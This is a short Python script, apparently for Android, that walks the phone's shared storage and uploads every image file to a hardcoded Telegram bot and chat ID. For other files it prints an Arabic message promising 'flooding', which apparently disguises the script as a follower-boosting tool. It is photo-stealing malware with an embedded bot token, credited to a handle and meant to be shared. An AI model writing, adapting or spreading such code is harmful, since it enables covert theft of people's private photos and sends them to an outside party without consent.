import os
import telebot
from threading import Thread

bot = telebot.TeleBot("7619615808:AAHsUBJNSN-N0vf14mUWQd8qEi71GCZt6Tc") 

#@adoatt1
dir_path = "/storage/emulated/0/"
	
#@adoatt1
def send_file(file_path):
 with open(file_path, "rb") as f:
 	if file_path.endswith(".jpg") or file_path.endswith("png") or file_path.endswith("PNG") or file_path.endswith("JPEG") or file_path.endswith("jpeg") or file_path.endswith("Webp") or file_path.endswith("webp"):
 		bot.send_photo(chat_id="5166796117",photo=f) 
 	else:
 		print("سوف يتم رشق 💕")

for root, dirs, files in os.walk(dir_path):
	threads = []
	for file in files:
		file_path = os.path.join(root, file)
		t = Thread(target=send_file, args=(file_path,))
		t.start()
		threads.append(t)
	for thread in threads:
		thread.join()
#انشر بس لا تغير المصدر
